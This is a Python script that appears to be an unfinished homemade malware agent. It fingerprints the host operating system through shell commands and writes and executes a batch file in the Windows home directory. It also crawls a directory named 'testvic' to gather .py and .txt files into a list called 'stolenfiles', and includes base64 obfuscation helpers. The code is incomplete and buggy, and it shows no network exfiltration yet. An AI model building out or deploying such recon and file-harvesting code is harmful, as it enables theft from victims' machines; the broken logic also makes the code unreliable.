import socket,os,time,re
from itsdangerous import base64_decode, base64_encode

def t1(list,r):
    t = list
    if r >= 20: r = 5
    while r < 20: 
        t = base64_encode(t)
        t =t
        r+=1
    return t

def t2(rounded):
    found = False
    tt = 1
    while found == False:
        
        g = base64_decode(rounded)
        if str(g).__contains__('execution'): 
            print(g)
            found = True; 
        else: 
            tt+=1
            rounded = g
pys = ['stolenfiles']
txts = []
secrets = []
filebytes = []

def if_windows(env_var):

    cmd = f"echo catch me if you can!!!!!!!!!!!"
    #cmd = f"echo echo catch me if you can!!!!!!!!!!!' >> c:\{env_var}\\agent.bat"
    #os.system(cmd)
    agent =  open(f"{env_var}\\agent.bat",'w')
    agent.write(cmd)
    agent.close()
    time.sleep(1)
    os.system(f"{env_var}\\agent.bat")

def if_nix():
    os.system('uname -a > ~/names.txt')

def recon():
    print('system recon')
# to do: change test directory
    for root, dirs, files in os.walk("./testvic", topdown = False):
        for name in files:
      
            for i in files:
                tt = re.findall("\w*[\.]py|\w*[\.]txt", str(i) )
                if len(tt) > 0:
                    yu = os.path.join(root, name)
                    pys.append(yu)
                
        for name in dirs:
            for i in files:
                tt = re.findall("\w*[\.]txt", str(i) )
               
                if len(tt) > 0: txts.append(str(tt[0]))
def test_sys():
    print("checking files")
    l = os.system('uname > confirm.txt')
    if int(l) != 0:
        #print('not nix, testing windows')
        w = str(os.getenv('HOMEPATH'))
        if(w):
           w1 = os.system(f"powershell -c ls > c:{w}\confirmp.txt")
           if int(w1) != 0:
                print('powershell command failed')
                w2 = os.system(f"dir > c:{w}\confirmc.txt")
                if int(w2) == 0:
                    #print("windows with cmd only")
                    return 3
                else: 
                    #print("having trouble :( .\ :/ . . .")
                    return 4 
           else:
           #print("windows looks like")
                print("GEI!!!!")
                if_windows(f"{w}")
                return 2
        else:
            print("unexpxected error ")
            return 4
    else: 
        #print('looks like nix')
        return 1 
        #os.system("cat ~/confirm.txt")
        #if_nix()
    